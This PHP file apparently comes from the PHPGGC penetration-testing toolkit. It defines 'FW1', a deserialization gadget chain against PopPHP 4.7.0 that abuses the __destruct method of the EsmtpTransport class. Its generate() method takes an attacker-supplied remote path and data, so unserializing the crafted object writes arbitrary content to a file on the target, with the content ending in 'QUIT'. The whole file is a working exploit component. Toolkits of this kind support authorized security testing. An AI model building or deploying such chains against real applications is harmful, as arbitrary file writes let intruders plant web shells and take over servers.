<?php

namespace GadgetChain\PopPHP;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.7.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'the file content ends with QUIT';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \Pop\Mail\Transport\Smtp\EsmtpTransport($path, $data);
    }
}
